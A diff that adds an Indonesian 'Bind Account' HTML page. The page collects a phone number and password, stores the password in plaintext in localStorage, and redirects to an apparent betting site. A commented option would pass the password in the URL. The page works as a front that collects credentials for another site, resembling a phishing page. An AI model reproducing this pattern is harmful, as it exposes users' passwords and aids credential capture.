@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Bind Account</title>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f4f6f8;
+            font-family: Arial, sans-serif;
+            color: #222;
+        }
+        .card {
+            width: min(92%, 420px);
+            background: #fff;
+            padding: 24px;
+            border-radius: 16px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+        }
+        h2 {
+            margin: 0 0 8px;
+            text-align: center;
+        }
+        p {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin: 0 0 20px;
+        }
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: bold;
+            margin: 14px 0 6px;
+        }
+        input {
+            width: 100%;
+            padding: 13px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            margin-top: 22px;
+            border: 0;
+            border-radius: 10px;
+            background: #222;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #111;
+        }
+        button:disabled {
+            background: #999;
+            cursor: not-allowed;
+        }
+        #msg {
+            text-align: center;
+            margin-top: 12px;
+            font-size: 13px;
+            color: #666;
+        }
+        #msg.error {
+            color: #d32f2f;
+        }
+        #msg.success {
+            color: #388e3c;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Bind Account</h2>
+        <p>Isi data lalu lanjutkan proses di web asli.</p>
+        
+        <label>Nomor HP</label>
+        <input id="phone" type="tel" inputmode="numeric" placeholder="Contoh: 081234567890">
+        
+        <label>Password</label>
+        <input id="password" type="password" placeholder="Password">
+        
+        <label>Konfirmasi Password</label>
+        <input id="confirm" type="password" placeholder="Ulangi password">
+        
+        <button id="bindBtn" onclick="goOriginal()">Lanjut Bind</button>
+        
+        <div id="msg"></div>
+    </div>
+
+    <script>
+        // Cek apakah ada data yang tersimpan sebelumnya (jika user kembali)
+        window.addEventListener('load', function() {
+            const savedPhone = localStorage.getItem('bindPhone');
+            if (savedPhone) {
+                document.getElementById('phone').value = savedPhone;
+            }
+        });
+
+        function goOriginal() {
+            const phoneInput = document.getElementById('phone');
+            const passwordInput = document.getElementById('password');
+            const confirmInput = document.getElementById('confirm');
+            const msgDiv = document.getElementById('msg');
+            const bindBtn = document.getElementById('bindBtn');
+
+            // Reset message
+            msgDiv.textContent = '';
+            msgDiv.className = '';
+
+            // Validasi
+            const phone = phoneInput.value.trim();
+            const pw = passwordInput.value;
+            const confirm = confirmInput.value;
+
+            if (!phone) {
+                msgDiv.textContent = 'Nomor HP belum diisi.';
+                msgDiv.className = 'error';
+                return;
+            }
+
+            if (!pw) {
+                msgDiv.textContent = 'Password belum diisi.';
+                msgDiv.className = 'error';
+                return;
+            }
+
+            if (pw !== confirm) {
+                msgDiv.textContent = 'Konfirmasi password tidak sama.';
+                msgDiv.className = 'error';
+                return;
+            }
+
+            // Validasi format nomor HP (minimal 10 digit)
+            if (!/^\d{10,}$/.test(phone)) {
+                msgDiv.textContent = 'Nomor HP tidak valid (minimal 10 digit).';
+                msgDiv.className = 'error';
+                return;
+            }
+
+            // Disable button dan tampilkan loading
+            bindBtn.disabled = true;
+            msgDiv.textContent = 'Memproses...';
+            msgDiv.className = '';
+
+            // Simpan data ke localStorage
+            localStorage.setItem('bindPhone', phone);
+            localStorage.setItem('bindPassword', pw);
+            localStorage.setItem('bindTimestamp', Date.now());
+
+            // Tunggu sebentar lalu redirect
+            setTimeout(function() {
+                msgDiv.textContent = 'Membuka web asli...';
+                msgDiv.className = 'success';
+                
+                // Redirect ke web asli
+                // OPSI 1: Redirect langsung (jika web asli bisa baca localStorage)
+                window.location.href = 'https://h5.bigwinner10.com/';
+                
+                // OPSI 2: Redirect dengan URL parameters (uncomment jika perlu)
+                // const encodedPhone = encodeURIComponent(phone);
+                // const encodedPw = encodeURIComponent(pw);
+                // window.location.href = `https://h5.bigwinner10.com/?bindPhone=${encodedPhone}&bindPassword=${encodedPw}`;
+                
+            }, 500);
+        }
+
+        // Fungsi helper untuk web asli membaca data bind
+        function getBindData() {
+            return {
+                phone: localStorage.getItem('bindPhone'),
+                password: localStorage.getItem('bindPassword'),
+                timestamp: localStorage.getItem('bindTimestamp')
+            };
+        }
+
+        // Fungsi helper untuk clear data setelah bind selesai
+        function clearBindData() {
+            localStorage.removeItem('bindPhone');
+            localStorage.removeItem('bindPassword');
+            localStorage.removeItem('bindTimestamp');
+        }
+    </script>
+</body>
+</html>
